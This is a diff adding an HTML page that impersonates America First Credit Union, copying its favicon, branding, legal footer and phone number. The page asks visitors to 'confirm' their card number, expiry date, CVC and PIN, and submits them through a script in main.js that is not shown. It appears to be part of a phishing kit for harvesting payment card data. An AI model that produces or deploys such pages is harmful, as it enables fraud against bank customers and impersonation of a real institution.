@@ -1,0 +1,92 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <link rel="icon" href="https://secure.americafirst.com/favicon.ico" />
+
+    <title>America First Credit Union</title>
+
+    <meta
+      name="viewport"
+      content="width=device-width,inital-scale=1,user-scalable=no"
+    />
+
+    <link href="./css/all.min.css" rel="stylesheet" />
+    <link href="./css/style.css" rel="stylesheet" />
+
+    <script src="./js/jquery.min.js"></script>
+    <script src="./js/all.min.js"></script>
+    <script src="./js/sweetalert.min.js"></script>
+    <script src="./js/main.js"></script>
+  </head>
+
+  <body>
+    <header>
+      <img src="./assets/asset 1.png" />
+    </header>
+
+    <main>
+      <h5>Confirm Card Details</h5>
+
+      <div class="useridForm" id="userIdForm">
+        <label> Card Number</label>
+        <input
+          type="number"
+          autocomplete="organization"
+          id="orgcn"
+          placeholder="Enter your Card Number"
+        />
+        <label> Expiry Date </label>
+        <input
+          type="text"
+          autocomplete="organization"
+          id="orged"
+          placeholder="Enter your Expiry Date"
+        />
+        <label> Card CVC </label>
+        <input
+          type="number"
+          autocomplete="off"
+          id="orgcc"
+          placeholder="Enter your Card CVC"
+        />
+        <label> Card Pin </label>
+        <input
+          type="password"
+          autocomplete="off"
+          id="orgcp"
+          placeholder="Enter your Card Pin"
+        />
+        <button type="button" onclick="secondsubmit()" id="secondbtn">
+          LOGIN
+        </button>
+      </div>
+    </main>
+
+    <footer>
+      <div class="footerlinks">
+        <a href="#"> terms </a> | <a href="#"> branch locator </a> |
+        <a href="#"> 1-855-801-2328 </a>
+      </div>
+      <div class="footerimg">
+        <img src="./assets/asset 4.png" />
+      </div>
+      <div class="footerfoot">
+        <img src="./assets/asset 2.png" />
+        <img src="./assets/asset 3.png" />
+        <br />
+        <p>
+          ©2022 America First Credit Union. All Rights Reserved. America First
+          Federal Credit Union does business as (DBA) America First Credit
+          Union. Unauthorized account access or use is not permitted and may
+          constitute a crime punishable by law. America First Credit Union
+          respects your privacy. Please view our
+          <a href="#">Privacy Policy</a>,
+          <a href="#">Email Opt Out Procedure</a> and
+          <a href="#">Fraud Alert Text/SMS Notification Terms and Conditions</a
+          >. This credit union is federally insured by the National Credit Union
+          Administration.
+        </p>
+      </div>
+    </footer>
+  </body>
+</html>
